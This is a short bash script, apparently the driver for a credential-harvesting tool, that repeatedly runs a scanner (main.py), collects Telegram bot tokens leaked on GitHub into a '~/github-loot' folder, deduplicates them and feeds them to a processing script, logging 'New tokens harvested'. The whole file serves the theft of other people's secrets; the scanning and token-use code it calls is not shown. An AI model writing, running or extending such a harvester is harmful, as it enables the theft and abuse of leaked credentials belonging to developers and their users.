#!/bin/bash

mkdir ~/github-loot

while true; do
    echo "Starting scan... - "`date`
    python3 main.py >> run_log.txt
    cat tg_tokens.txt | sort | uniq > ~/github-loot/telegram/tokens.txt
    ~/github-loot/telegram/process_tokens.py ~/github-loot/telegram/tokens.txt - >> ~/github-loot/telegram/tg.txt
    echo "New tokens harvested - "`date`
done
